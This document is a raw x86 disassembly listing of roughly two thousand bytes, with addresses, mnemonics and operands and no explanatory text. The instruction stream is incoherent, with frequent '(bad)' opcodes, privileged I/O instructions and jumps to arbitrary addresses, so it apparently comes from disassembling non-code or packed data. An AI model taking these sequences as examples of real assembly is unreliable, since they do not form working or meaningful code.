  4365ba:	leave  
  4365bb:	inc    esp
  4365bd:	fs cmp eax,0x6d645b24
  4365c3:	and    al,0x0
  4365c5:	pop    edi
  4365c6:	pop    esp
  4365c7:	leave  
  4365c8:	add    bh,bl
  4365ca:	or     BYTE PTR [esi-0x75],0x6e
  4365ce:	fs retf 
  4365d0:	call   0x3dc0a6
  4365d5:	mov    al,0x15
  4365d7:	cs sti 
  4365d9:	fsubrp st(5),st
  4365db:	jge    0x4365b2
  4365dd:	and    BYTE PTR [edi],0xe9
  4365e0:	jge    0x4365b1
  4365e2:	push   ss
  4365e3:	cli    
  4365e4:	mov    esi,DWORD PTR [esi]
  4365e6:	add    eax,0x18555622
  4365eb:	jbe    0x4365ec
  4365ed:	fs call 0x18a7c66f
  4365f3:	cli    
  4365f4:	cmp    esp,DWORD PTR [eax-0x18]
  4365f7:	jl     0x436583
  4365f9:	retf   
  4365fa:	fadd   QWORD PTR [eax]
  4365fc:	xor    dh,BYTE PTR [eax+0x6]
  4365ff:	jbe    0x436601
  436601:	mov    ebx,0x7f8b62dc
  436606:	rcr    DWORD PTR [edi],0x66
  436609:	(bad)  
  43660a:	stc    
  43660b:	mov    edi,0xbffb7023
  436610:	and    edi,DWORD PTR [ecx+0xd]
  436613:	enter  0x7223,0x9
  436617:	shl    BYTE PTR [ebx],0x56
  43661a:	call   0xf88b:0x47944e7a
  436621:	loope  0x436662
  436623:	ja     0x43662e
  436625:	fisubr WORD PTR [ebx+0x7d00f977]
  43662b:	sti    
  43662c:	inc    esi
  43662d:	call   0xf9badea2
  436632:	fnstenv [edi+0x77]
  436635:	je     0x436675
  436637:	mov    ds:0xecc8ca8b,al
  43663c:	fs inc eax
  43663e:	push   edi
  43663f:	pop    es
  436640:	ja     0x436677
  436642:	and    DWORD PTR [ebp+0xb2d850b],esi
  436648:	inc    esi
  436649:	call   0xf9b9bca5
  43664e:	dec    ecx
  43664f:	mov    eax,0x552df883
  436654:	inc    ecx
  436656:	sahf   
  436657:	ficom  WORD PTR [edx*2-0x2acd7bf7]
  43665e:	jmp    0xb7ecd259
  436663:	shl    BYTE PTR [esi-0x80],0x9
  436667:	cmp    ecx,0x206de219
  43666d:	sbb    BYTE PTR [eax+0x76f90f6e],bl
  436673:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436674:	and    al,0x7d
  436676:	sbb    BYTE PTR [edi-0x51798b8a],dl
  43667c:	mov    ecx,edx
  43667e:	retf   0x7787
  436681:	stc    
  436682:	int    0xd8
  436684:	fs inc esp
  436686:	pop    ebx
  436687:	outs   dx,BYTE PTR ds:[esi]
  436688:	stos   DWORD PTR es:[edi],eax
  436689:	mov    bh,bh
  43668b:	and    DWORD PTR [ebp-0x6844ff81],0x63bd8930
  436695:	xor    BYTE PTR [ebx+eiz*4],dl
  436698:	fidivr WORD PTR [ecx-0x3e26dd5a]
  43669e:	scas   al,BYTE PTR es:[edi]
  43669f:	fst    DWORD PTR [edi-0x7f677659]
  4366a5:	mov    ecx,0x90978880
  4366aa:	enter  0xe141,0xe8
  4366ae:	mul    DWORD PTR [edx+0x64]
  4366b1:	cwde   
  4366b2:	ins    BYTE PTR es:[edi],dx
  4366b3:	aad    0x55
  4366b5:	jg     0x436734
  4366b7:	fistp  WORD PTR [esi-0x2699bde8]
  4366bd:	push   0x70
  4366bf:	jb     0x4366eb
  4366c1:	or     eax,0x1b90e6d5
  4366c6:	outs   dx,DWORD PTR ds:[esi]
  4366c7:	je     0x43667b
  4366c9:	and    ebp,ebp
  4366cb:	imul   esp,esi,0xd9629767
  4366d1:	jmp    0x1c0e8906
  4366d6:	mov    ebx,DWORD PTR [esi-0x4c3e1a43]
  4366dc:	bound  esi,QWORD PTR [edi-0xe78e8f5]
  4366e2:	adc    eax,0xc6730991
  4366e7:	popa   
  4366e8:	pop    edx
  4366e9:	jle    0x436712
  4366eb:	push   esi
  4366ec:	fldcw  WORD PTR [edx-0x18]
  4366ef:	inc    ecx
  4366f0:	icebp  
  4366f1:	jmp    0xbdc96776
  4366f6:	fld    QWORD PTR [ebx]
  4366f8:	aaa    
  4366f9:	mov    al,ds:0xe6323c6a
  4366fe:	add    BYTE PTR [ebp+0x21],bl
  436701:	adc    al,0xca
  436703:	jmp    0x4366b5
  436705:	and    al,0xf8
  436707:	pop    edi
  436708:	outs   dx,BYTE PTR ds:[esi]
  436709:	bound  eax,QWORD PTR [ebp+0x5]
  43670c:	xchg   BYTE PTR [eax-0x7a1d1a91],dl
  436712:	add    eax,0xf7deb7ce
  436717:	ds dec esi
  436719:	sbb    DWORD PTR [edi-0x32],0x2f89901c
  436720:	dec    edx
  436721:	pop    ebp
  436722:	shl    DWORD PTR ds:0xcd6d9040,0x3d
  436729:	bound  eax,QWORD PTR [ebp-0x3b]
  43672c:	pop    ecx
  43672d:	add    DWORD PTR [ecx],eax
  43672f:	jmp    0xe9adfdc5
  436734:	stc    
  436735:	adc    ah,dh
  436737:	test   dh,ah
  436739:	fild   QWORD PTR [esi+0x6b98e5a2]
  43673f:	call   0x1160822d
  436744:	pop    edi
  436745:	sbb    bl,cl
  436747:	je     0x43675e
  436749:	mov    edx,0x7d3d510c
  43674e:	not    BYTE PTR [esi-0x16]
  436751:	sbb    al,0x1d
  436753:	stc    
  436754:	jb     0x4366fd
  436756:	inc    ebx
  436757:	lods   al,BYTE PTR ds:[esi]
  436758:	add    dl,ah
  43675a:	cwde   
  43675b:	sub    DWORD PTR [eax+0x25],esi
  43675e:	mov    edx,0xe206f210
  436763:	pop    es
  436764:	imul   edx,DWORD PTR [edi],0xffffff91
  436767:	clc    
  436768:	es daa 
  43676a:	xor    DWORD PTR [esi+0x73],edx
  43676d:	mov    ds:0x512d842c,al
  436772:	push   edi
  436773:	std    
  436774:	call   0x608453
  436779:	imul   DWORD PTR [eax+0x61818b53]
  43677f:	loopne 0x436706
  436781:	mov    edx,DWORD PTR [ebx+0x2808b09]
  436787:	mov    ch,BYTE PTR [edi-0x3f7bee43]
  43678d:	inc    edx
  43678e:	fldenv ds:0x51d3a0c0
  436794:	mov    ebx,DWORD PTR [edi]
  436796:	mov    ecx,0xabf2330c
  43679b:	inc    edi
  43679c:	call   DWORD PTR [edi-0x47]
  43679f:	and    BYTE PTR [edi+0x7b],dl
  4367a2:	scas   al,BYTE PTR es:[edi]
  4367a3:	inc    edi
  4367a4:	push   ebp
  4367a5:	mov    esp,0x3b1294e7
  4367aa:	fld    QWORD PTR [ebx+0x75e95dc0]
  4367b0:	jl     0x436759
  4367b2:	icebp  
  4367b3:	add    BYTE PTR [esi+0x76],bh
  4367b6:	pop    ecx
  4367b7:	jne    0x4367f1
  4367b9:	(bad)  
  4367bb:	ins    BYTE PTR es:[edi],dx
  4367bc:	push   cs
  4367bd:	add    BYTE PTR [eax],ah
  4367bf:	push   ebp
  4367c0:	and    al,0x18
  4367c2:	dec    edi
  4367c3:	xchg   ebp,eax
  4367c4:	and    eax,0xc2d9e0c0
  4367c9:	add    al,0x83
  4367cb:	fstp   QWORD PTR [ecx+0x5d]
  4367ce:	and    BYTE PTR [edi],bl
  4367d0:	add    eax,0x51a9fa00
  4367d5:	push   0x3b
  4367d7:	xchg   eax,edi
  4367d9:	(bad)  
  4367da:	out    0xf4,eax
  4367dc:	sbb    BYTE PTR [ebx-0x76209bb6],cl
  4367e2:	(bad)  
  4367e3:	hlt    
  4367e4:	or     al,0xe8
  4367e6:	scas   al,BYTE PTR es:[edi]
  4367e7:	adc    dl,bh
  4367e9:	call   DWORD PTR [eax-0x23007beb]
  4367ef:	xchg   esp,eax
  4367f0:	and    eax,0xbdd762c0
  4367f5:	inc    eax
  4367f6:	xchg   esp,eax
  4367f7:	test   DWORD PTR [ebx-0x18],0xf97c1ea3
  4367fe:	jmp    0x4f35e995
  436803:	push   ecx
  436804:	xchg   DWORD PTR [esi+eax*4-0x4a],ecx
  436808:	iret   
  436809:	push   eax
  43680a:	sub    al,0x7b
  43680c:	call   0x514aea34
  436811:	mov    edx,DWORD PTR ds:0xad596cab
  436817:	mov    ds:0xd6a1357b,eax
  43681c:	pop    es
  43681d:	test   DWORD PTR [edx+ebp*4-0x6aff43d2],ebp
  436824:	dec    ebx
  436825:	das    
  436826:	sar    BYTE PTR [ecx-0x4a],0x87
  43682a:	inc    esp
  43682b:	fiadd  WORD PTR ds:[ecx-0x7a800940]
  436832:	sbb    cl,ch
  436834:	inc    esp
  436835:	xlat   BYTE PTR ds:[ebx]
  436836:	pop    ecx
  436837:	or     eax,0x5abdd5c5
  43683c:	add    BYTE PTR [edi-0x308179bc],0x52
  436843:	jmp    0xe82aefaf
  436848:	inc    ecx
  436849:	cmc    
  43684a:	or     cl,bl
  43684c:	(bad)  
  43684d:	imul   ebp,ecx,0xc
  436850:	xor    al,0x7b
  436852:	and    DWORD PTR [edx],0xffffffa9
  436855:	clc    
  436856:	sub    al,0x22
  436858:	pop    ss
  436859:	cmp    al,0x51
  43685b:	and    eax,0xe9181856
  436860:	push   ebp
  436861:	sbb    BYTE PTR [eax],bl
  436863:	lods   eax,DWORD PTR ds:[esi]
  436864:	jb     0x436835
  436866:	sub    al,0x29
  436868:	outs   dx,DWORD PTR ds:[esi]
  436869:	sar    eax,1
  43686b:	outs   dx,DWORD PTR ds:[esi]
  43686c:	fldenv [ecx]
  43686e:	adc    al,0xa2
  436870:	fstp   DWORD PTR [ebx+eax*2+0x78]
  436874:	call   0xf1854049
  436879:	xchg   DWORD PTR [edx],edx
  43687b:	adc    dl,0x9d
  43687e:	ret    0xcdb
  436881:	fidivr DWORD PTR [esi]
  436883:	push   ds
  436884:	mov    ebp,0x6100f7d1
  436889:	enter  0x6e29,0x60
  43688d:	enter  0xe2b0,0xe4
  436891:	in     al,0x1e
  436893:	fstp   DWORD PTR [eax]
  436895:	xor    BYTE PTR [eax+ecx*1-0x2ed2d59e],ch
  43689c:	aas    
  43689d:	fst    DWORD PTR [ebx+0x4]
  4368a0:	fwait
  4368a1:	or     al,0xfe
  4368a3:	sbb    ebx,edi
  4368a5:	cdq    
  4368a6:	arpl   WORD PTR [esi-0x1b],bp
  4368a9:	sbb    al,0xfe
  4368ab:	(bad)  
  4368ad:	bound  ebx,QWORD PTR [edi-0x5da08487]
  4368b3:	jg     0x436930
  4368b5:	adc    esp,esi
  4368b7:	xor    al,0xa2
  4368b9:	jg     0x4368e7
  4368bb:	rcl    DWORD PTR [ebx],0x66
  4368be:	out    dx,al
  4368bf:	cmp    BYTE PTR [edx+0x15],cl
  4368c2:	inc    ebx
  4368c3:	jns    0x436920
  4368c5:	pop    edi
  4368c6:	jp     0x436947
  4368c8:	push   eax
  4368c9:	push   cs
  4368ca:	mov    ecx,0xedbd968c
  4368cf:	aam    0x92
  4368d1:	sub    edx,DWORD PTR [edi-0x10]
  4368d4:	cmp    DWORD PTR [ecx+0x32d94f62],0x928b6c47
  4368de:	aas    
  4368df:	jns    0x436938
  4368e1:	xchg   esi,eax
  4368e2:	scas   al,BYTE PTR es:[edi]
  4368e3:	or     al,0xdf
  4368e5:	mov    ds:0x4df84101,eax
  4368ea:	clc    
  4368eb:	add    BYTE PTR cs:[edi-0x67],cl
  4368ef:	in     al,dx
  4368f0:	cmc    
  4368f1:	out    dx,al
  4368f2:	sbb    eax,0x9974fd1d
  4368f7:	ins    DWORD PTR es:[edi],dx
  4368f8:	jmp    0x4368d2
  4368fa:	icebp  
  4368fb:	mov    esp,DWORD PTR [edi]
  4368fd:	pop    es
  4368fe:	xor    DWORD PTR [eax-0x5c],ebx
  436901:	mov    eax,0xdee90954
  436906:	retf   0x7df7
  436909:	fs adc al,0x3a
  43690c:	jmp    0x193b43c6
  436911:	cmp    esp,esi
  436913:	cwde   
  436914:	sti    
  436915:	mov    eax,ds:0xdf3cc392
  43691a:	test   DWORD PTR [ebp+eax*8-0x1ec1a3d7],eax
  436921:	out    0x85,al
  436923:	add    eax,0x78901b04
  436928:	mov    dh,0xb3
  43692a:	cld    
  43692b:	add    BYTE PTR [ecx],bl
  43692d:	or     eax,DWORD PTR [esi]
  43692f:	or     eax,0xfaf072
  436934:	sahf   
  436935:	test   dl,ah
  436937:	neg    DWORD PTR [edx+ebx*2]
  43693a:	nop
  43693b:	outs   dx,BYTE PTR ds:[esi]
  43693c:	loope  0x436928
  43693e:	in     eax,0xdc
  436940:	(bad)  [ecx]
  436942:	xchg   edx,eax
  436943:	add    DWORD PTR [ecx-0x4502f926],0xffffffa1
  43694a:	jl     0x43696c
  43694c:	jbe    0x436952
  43694e:	jmp    0x89d8:0xe100e900
  436955:	out    0x45,eax
  436957:	in     al,dx
  436958:	and    DWORD PTR [ebp+0x6af7e14d],0x1d
  43695f:	mov    dh,0x4
  436961:	add    BYTE PTR [ebx+ebx*2-0x59ecdbc3],ah
  436968:	dec    eax
  436969:	push   eax
  43696a:	and    esi,edx
  43696c:	jge    0x43693c
  43696e:	mov    ds:0xbfff705,eax
  436973:	inc    esi
  436974:	clc    
  436975:	pop    ebp
  436976:	jo     0x4369ab
  436978:	pop    esp
  436979:	ret    0xd5ef
  43697c:	push   ebx
  43697d:	mov    esp,edi
  43697f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436980:	inc    edi
  436981:	lea    ecx,[esi]
  436983:	push   cs
  436984:	push   ecx
  436985:	call   FWORD PTR [edx]
  436987:	adc    DWORD PTR [eax+ebp*8],edx
  43698a:	test   eax,0x7b84f895
  43698f:	add    DWORD PTR [edx+esi*1],0xb
  436993:	(bad)  
  436994:	adc    BYTE PTR [ebx+0x457de586],cl
  43699a:	xchg   ebx,eax
  43699b:	arpl   ax,di
  43699d:	mov    bh,BYTE PTR [esi+0x11]
  4369a0:	add    BYTE PTR [ecx-0x71],0x45
  4369a4:	clc    
  4369a5:	enter  0xd8c9,0x0
  4369a9:	push   ebp
  4369aa:	add    BYTE PTR [ecx],al
  4369ac:	jbe    0x43699a
  4369ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4369af:	pusha  
  4369b0:	inc    esp
  4369b1:	hlt    
  4369b2:	push   ecx
  4369b3:	fcom   QWORD PTR [eax+0x6a]
  4369b6:	add    BYTE PTR [ebx-0x75010781],cl
  4369bc:	or     dl,BYTE PTR [eax+eax*1]
  4369bf:	imul   edx,DWORD PTR [ebp-0x74f47b08],0x50b3204
  4369c9:	adc    DWORD PTR [ebx+0x4d7ddd6e],ecx
  4369cf:	iret   
  4369d0:	pop    esi
  4369d1:	dec    DWORD PTR [edx+0x4a8014f6]
  4369d7:	aas    
  4369d8:	dec    ebp
  4369d9:	clc    
  4369da:	enter  0xc462,0x0
  4369de:	add    BYTE PTR ds:0x880c18a7,ah
  4369e4:	sub    BYTE PTR [edi+0x74],0x3e
  4369e8:	mov    dl,0x6f
  4369ea:	je     0x436a32
  4369ec:	mov    dl,0x6f
  4369ee:	das    
  4369ef:	add    eax,0xa20e04a6
  4369f4:	and    BYTE PTR [edi-0x28],0x59
  4369f8:	ret    0xd867
  4369fb:	and    BYTE PTR [edi+0x4],dh
  4369fe:	push   ebx
  4369ff:	(bad)  [esi+0x56265cd]
  436a05:	ret    0x32fb
  436a08:	(bad)  
  436a09:	icebp  
  436a0a:	or     ecx,ebp
  436a0c:	or     eax,0x7f93f90c
  436a11:	adc    eax,esp
  436a13:	push   eax
  436a14:	ret    0x84fc
  436a17:	daa    
  436a18:	scas   al,BYTE PTR es:[edi]
  436a19:	add    esi,0x0
  436a1c:	lods   eax,DWORD PTR ds:[esi]
  436a1d:	std    
  436a1e:	inc    ebx
  436a1f:	or     DWORD PTR [esi],ebx
  436a21:	cmp    al,0x8b
  436a23:	mov    edi,0xc44ab
  436a28:	sub    al,0xe7
  436a2a:	xor    edi,ecx
  436a2c:	xchg   esp,eax
  436a2d:	jge    0x4369eb
  436a2f:	je     0x436a4f
  436a31:	cmp    ch,0x84
  436a34:	jae    0x436a23
  436a36:	daa    
  436a37:	dec    ebp
  436a38:	mov    ecx,0x6243f0ee
  436a3d:	shr    DWORD PTR [edi+0x13],cl
  436a40:	push   ss
  436a41:	xchg   esp,eax
  436a42:	(bad)  
  436a43:	(bad)  
  436a44:	std    
  436a45:	sbb    eax,ebp
  436a47:	inc    ebx
  436a48:	bound  ebp,QWORD PTR [edx]
  436a4a:	std    
  436a4b:	jb     0x436ab8
  436a4d:	jbe    0x436a4c
  436a4f:	xchg   BYTE PTR [edi+0x6243efee],al
  436a55:	fnstenv [eax+0x38]
  436a58:	xchg   edx,eax
  436a59:	adc    BYTE PTR [esi-0x72321afd],bl
  436a5f:	out    dx,eax
  436a60:	mov    eax,ds:0x96bb8bd9
  436a65:	adc    eax,0xe61ad2ea
  436a6a:	test   eax,0x92d9a211
  436a6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436a70:	mov    dl,0x10
  436a72:	sahf   
  436a73:	add    esp,ecx
  436a75:	cwde   
  436a76:	xchg   ebp,eax
  436a77:	sub    ecx,DWORD PTR [edx-0x123c8947]
  436a7d:	mov    ?,ebp
  436a7f:	daa    
  436a80:	add    BYTE PTR [ecx+ebx*1-0x16],dl
  436a84:	and    BYTE PTR [edx-0x32142afc],0x36
  436a8b:	stos   BYTE PTR es:[edi],al
  436a8c:	add    esi,DWORD PTR [edx]
  436a8e:	nop
  436a8f:	aad    0x33
  436a91:	push   esp
  436a92:	sbb    edx,ebp
  436a94:	mov    ds:0x4261012,al
  436a99:	loope  0x436a33
  436a9b:	dec    ebp
  436a9c:	add    BYTE PTR [ecx+ebx*4-0x3d],bh
  436aa0:	adc    edi,DWORD PTR [ecx+eax*8]
  436aa3:	(bad)  
  436aa4:	lock inc ecx
  436aa6:	in     eax,0x16
  436aa8:	jne    0x436afa
  436aaa:	nop
  436aab:	call   0xaa6d:0xa9f3aa6d
  436ab2:	das    
  436ab3:	or     BYTE PTR [edx+0x6e],al
  436ab6:	fnstenv [edi]
  436ab8:	int    0x46
  436aba:	nop
  436abb:	nop
  436abc:	push   DWORD PTR [ebp+0x65042604]
  436ac2:	bound  ebx,QWORD PTR [ecx+0x432a92ef]
  436ac8:	clc    
  436ac9:	rcl    DWORD PTR ds:0xe54ad0ea,1
  436acf:	add    BYTE PTR ds:0x49011970,ah
  436ad5:	inc    BYTE PTR ds:0x8f09e93d
  436adb:	ins    DWORD PTR es:[edi],dx
  436adc:	add    BYTE PTR [edx-0x72],bl
  436adf:	mov    DWORD PTR [edx+ebx*1],edx
  436ae2:	adc    bh,BYTE PTR ds:0xd2e800e9
  436ae8:	push   eax
  436ae9:	(bad)  
  436aea:	aad    0x8e
  436aec:	mov    esp,edi
  436aee:	aad    0x5
  436af0:	cmp    eax,0x6d51c3e9
  436af5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436af6:	popa   
  436af7:	sbb    al,0xf8
  436af9:	cld    
  436afa:	and    ebp,ebx
  436afc:	inc    eax
  436afd:	jmp    0x9688db0c
  436b02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436b03:	mov    ?,WORD PTR [ebp+0x29]
  436b06:	int    0xb6
  436b08:	push   0x119eec9
  436b0d:	(bad)  
  436b0e:	pop    esp
  436b0f:	mov    ebp,0x5a61a912
  436b14:	shl    DWORD PTR [ebp+0x6c],0x1
  436b18:	sbb    DWORD PTR [esi-0x21b7715f],ecx
  436b1e:	pop    esp
  436b1f:	leave  
  436b20:	adc    ch,BYTE PTR [ecx]
  436b22:	pop    esi
  436b23:	ins    BYTE PTR es:[edi],dx
  436b24:	inc    ebp
  436b25:	dec    esi
  436b26:	mov    ds:0x84a97d8e,al
  436b2b:	fidiv  DWORD PTR [edx]
  436b2d:	test   eax,0x16addfa
  436b32:	syscall 
  436b34:	sbb    eax,0x2f91aed5
  436b39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436b3a:	adc    DWORD PTR [eax-0x77d9fd27],ecx
  436b40:	fnstenv [esi]
  436b42:	mov    WORD PTR [ebp+eax*1-0x17],cs
  436b46:	sub    al,0x55
  436b48:	in     eax,0x0
  436b4a:	add    al,cl
  436b4c:	mul    BYTE PTR [ebx+edx*2]
  436b4f:	jne    0x436bb1
  436b51:	je     0x436b67
  436b53:	fs pusha 
  436b55:	rol    BYTE PTR [ebp-0x1794814b],1
  436b5b:	imul   ebp,edx,0xd94ffffa
  436b61:	fs jmp 0xdbd8:0x4456
  436b68:	stos   BYTE PTR es:[edi],al
  436b69:	jge    0x436b36
  436b6b:	mov    bl,0x44
  436b6d:	sti    
  436b6e:	dec    DWORD PTR [esi+ecx*1-0x3f]
  436b72:	jne    0x436b68
  436b74:	mov    eax,0xda8be9
  436b7a:	add    BYTE PTR [eax+0x70000087],cl
  436b80:	(bad)  
  436b81:	push   esp
  436b82:	push   ss
  436b83:	mov    ebx,0x10085ed9
  436b88:	jle    0x436b95
  436b8a:	push   ebx
  436b8b:	dec    esi
  436b8c:	dec    edi
  436b8d:	rcl    BYTE PTR [eax-0x34],1
  436b90:	jnp    0x436b92
  436b92:	jmp    DWORD PTR [ecx+ebx*2-0x43]
  436b96:	or     al,0x48
  436b98:	xchg   DWORD PTR [eax+eax*1],ecx
  436b9b:	pop    ss
  436b9c:	fadd   DWORD PTR [ebp-0x73]
  436b9f:	xchg   ch,dh
  436ba1:	push   eax
  436ba2:	inc    DWORD PTR [esi]
  436ba4:	fyl2xp1 
  436ba6:	xlat   BYTE PTR ds:[ebx]
  436ba7:	or     BYTE PTR [ecx],ah
  436ba9:	add    eax,0xe51e83
  436bae:	je     0x436bb0
  436bb0:	jle    0x436b58
  436bb2:	mov    eax,DWORD PTR [ebp-0x5d]
  436bb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436bb6:	stc    
  436bb7:	jne    0x436b54
  436bb9:	or     dl,dl
  436bbb:	add    edi,0xffffffd8
  436bbe:	inc    ebp
  436bbf:	lea    eax,[esi+0x5]
  436bc2:	push   ecx
  436bc3:	push   esi
  436bc4:	bound  esp,QWORD PTR [edi+0x5c]
  436bc7:	in     eax,0x8d
  436bc9:	div    ecx
  436bcb:	psubsw mm7,QWORD PTR [ebx]
  436bce:	mov    bh,cl
  436bd0:	pop    ebp
  436bd1:	mov    dh,0x4a
  436bd3:	push   eax
  436bd4:	inc    ebp
  436bd5:	mov    ?,eax
  436bd7:	clc    
  436bd8:	mov    bh,0x7a
  436bda:	jae    0x436c09
  436bdc:	xor    eax,0xa20dfc8e
  436be1:	or     BYTE PTR [ecx-0x75ed5140],0xf2
  436be8:	xchg   esi,eax
  436be9:	xchg   ecx,eax
  436bea:	mov    ecx,edi
  436bec:	mov    es,WORD PTR [ebp+0x64b507d6]
  436bf2:	jae    0x436c07
  436bf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436bf5:	lods   al,BYTE PTR ds:[esi]
  436bf6:	(bad)  
  436bf7:	jmp    eax
  436bf9:	mov    dh,0x0
  436bfb:	mov    al,0x63
  436bfd:	xchg   ebx,eax
  436bfe:	rcl    BYTE PTR [ebx+ebx*1-0x3f],cl
  436c02:	or     al,0x0
  436c04:	(bad)  
  436c05:	mul    DWORD PTR [eax+0x4f]
  436c08:	xor    al,0x43
  436c0a:	ja     0x436bfb
  436c0c:	sub    al,0x7
  436c0e:	addr16 stc 
  436c10:	ja     0x436c00
  436c12:	push   cs
  436c13:	inc    eax
  436c14:	add    BYTE PTR [edx-0x1],ah
  436c17:	fs stc 
  436c19:	xor    edi,DWORD PTR ss:[edi+0x4b]
  436c1d:	mov    dh,0x73
  436c1f:	jg     0x436c01
  436c21:	push   edx
  436c22:	inc    ecx
  436c23:	adc    edx,DWORD PTR fs:[edx]
  436c26:	sbb    BYTE PTR [eax],al
  436c28:	data16 gs sbb bh,ch
  436c2c:	jmp    DWORD PTR [edx+0x2]
  436c2f:	fimul  DWORD PTR [edx-0x15a3b1e1]
  436c35:	xchg   BYTE PTR [ebx+0x73],al
  436c38:	test   BYTE PTR [edx-0x5dd2ed3a],ah
  436c3e:	fnstcw WORD PTR [ecx]
  436c40:	aam    0x1d
  436c42:	and    al,0x65
  436c44:	shr    BYTE PTR [ecx-0x7f],0xe9
  436c48:	jb     0x436ca5
  436c4a:	mov    WORD PTR [esi+0x43],ds
  436c4d:	into   
  436c4e:	(bad)  [eax+eax*8+0x49]
  436c52:	xor    DWORD PTR ds:0x3a8c4b6f,0x54df4704
  436c5c:	sar    BYTE PTR [ecx],0x81
  436c5f:	cdq    
  436c60:	outs   dx,DWORD PTR ds:[esi]
  436c61:	sub    ecx,DWORD PTR [esp+ebx*1+0x212b8b44]
  436c68:	inc    ebp
  436c69:	outs   dx,BYTE PTR ds:[esi]
  436c6a:	fldcw  WORD PTR [esi+edi*2+0x6b465806]
  436c71:	(bad)  
  436c72:	jge    0x436c86
  436c74:	xchg   DWORD PTR [ecx+0xd9e9e5],ecx
  436c7a:	xchg   edx,eax
  436c7b:	pusha  
  436c7c:	xor    edi,esi
  436c7e:	js     0x436c01
  436c80:	in     al,dx
  436c81:	adc    ebp,eax
  436c83:	mov    edx,esi
  436c85:	pop    es
  436c86:	je     0x436c8d
  436c88:	mov    ecx,0xd5b52680
  436c8d:	shl    DWORD PTR [eax+eiz*2],cl
  436c90:	das    
  436c91:	pop    ebx
  436c92:	jmp    0xdeb56424
  436c97:	cwde   
  436c98:	jbe    0x436c86
  436c9a:	ds push cs
  436c9c:	loop   0x436ca1
  436c9e:	ffreep st(5)
  436ca0:	cmp    eax,0x4dd9221a
  436ca5:	add    DWORD PTR [ecx+eiz*8],edi
  436ca8:	into   
  436ca9:	mul    DWORD PTR [ebp+0x5e]
  436cac:	push   ds
  436cad:	sub    BYTE PTR [edx+0x29],dh
  436cb0:	mov    edi,0xe6950f5a
  436cb5:	test   BYTE PTR [ecx],cl
  436cb7:	fld    QWORD PTR [eax]
  436cb9:	jmp    0xe1ae4d33
  436cbe:	repnz pop es
  436cc0:	add    eax,0x18b79a74
  436cc5:	cmp    ebx,esi
  436cc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436cc8:	test   BYTE PTR [ebp-0x689f39e],ch
  436cce:	popa   
  436ccf:	add    eax,0x924e1308
  436cd4:	outs   dx,BYTE PTR ds:[esi]
  436cd5:	fld    st(4)
  436cd7:	adc    eax,0x9211c91d
  436cdc:	iret   
  436cdd:	push   0x0
  436cdf:	stos   BYTE PTR es:[edi],al
  436ce0:	(bad)  [edx-0xf]
  436ce3:	mov    dl,0x6
  436ce5:	or     eax,0x28b71a6c
  436cea:	mov    ecx,0xb05aa792
  436cef:	xchg   esp,eax
  436cf0:	adc    eax,0x1c31f51d
  436cf5:	mov    WORD PTR [esi],gs
  436cf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436cf8:	xchg   edi,eax
  436cf9:	div    BYTE PTR [esi]
  436cfb:	jae    0x436d71
  436cfd:	adc    BYTE PTR [esi],ch
  436cff:	in     eax,dx
  436d00:	(bad)  
  436d02:	pushf  
  436d03:	in     eax,dx
  436d04:	xchg   ecx,eax
  436d05:	outs   dx,BYTE PTR ds:[esi]
  436d06:	icebp  
  436d07:	jb     0x436cd1
  436d09:	idiv   esp
  436d0b:	fild   DWORD PTR gs:[eax-0x17]
  436d0f:	pop    edx
  436d10:	mov    cl,0x1c
  436d12:	sub    DWORD PTR [ebx-0x4f],ecx
  436d15:	pop    eax
  436d16:	lahf   
  436d17:	inc    esi
  436d18:	jbe    0x436d70
  436d1a:	sub    edx,DWORD PTR [esi-0x27]
  436d1d:	dec    esi
  436d1e:	bound  esi,QWORD PTR [ecx]
  436d20:	add    DWORD PTR [ecx+0x4ed961e9],eax
  436d26:	fimul  WORD PTR [ebp+ecx*1+0x13]
  436d2a:	sub    DWORD PTR [esi+0x27],esp
  436d2d:	clc    
  436d2e:	hlt    
  436d2f:	xchg   ebp,eax
  436d30:	fadd   QWORD PTR [eax+0x0]
  436d33:	jnp    0x436d46
  436d35:	fstp   DWORD PTR [ebx]
  436d37:	mov    ebx,0xc85ed911
  436d3c:	mov    ds:0x2a08ec7d,eax
  436d41:	adc    DWORD PTR [ebx-0x5f6ca00],eax
  436d47:	push   ebx
  436d48:	sub    eax,0x4b8060b0
  436d4d:	(bad)  
  436d4e:	add    BYTE PTR [edx+0x48],ch
  436d51:	lods   al,BYTE PTR ds:[esi]
  436d52:	cmc    
  436d53:	addr16 cmp edx,esi
  436d56:	add    BYTE PTR [eax-0x3b3f596],al
  436d5c:	rol    BYTE PTR [ecx+ebp*8],0xc9
  436d60:	mov    al,0x9
  436d62:	cli    
  436d63:	xor    esp,DWORD PTR [eax+0x1374c152]
  436d69:	or     eax,DWORD PTR [eax+esi*8-0x25]
  436d6d:	or     cl,BYTE PTR [esp+edi*8-0x5d]
  436d71:	fcomip st,st(4)
  436d73:	jmp    DWORD PTR [edx+edx*2-0x413c8b3f]
  436d7a:	pop    ebx
  436d7b:	hlt    
  436d7c:	mov    esp,0x3b7d7da4
  436d81:	test   BYTE PTR [ebx],cl
  436d83:	add    DWORD PTR [esi+edx*8+0x0],0x4290fba0
  436d8b:	cmp    DWORD PTR [esi],edx
  436d8d:	add    dh,BYTE PTR [edx+0xb]
  436d90:	mov    al,0xfc
  436d92:	jno    0x436d9b
  436d94:	push   edx
  436d95:	call   0x2d02cc19
  436d9a:	push   ds
  436d9b:	mov    eax,DWORD PTR [esi+ebp*1-0x63b494d]
  436da2:	jg     0x436daa
  436da4:	ds adc eax,0x6800296d
  436daa:	pop    eax
  436dab:	dec    esp
  436dac:	hlt    
  436dad:	(bad)
  436db2:	and    al,0x71
  436db4:	stc    
  436db5:	ja     0x436d57
  436db7:	adc    eax,DWORD PTR [eax+0x62]
  436dba:	cmc    
  436dbb:	cmp    al,0x74
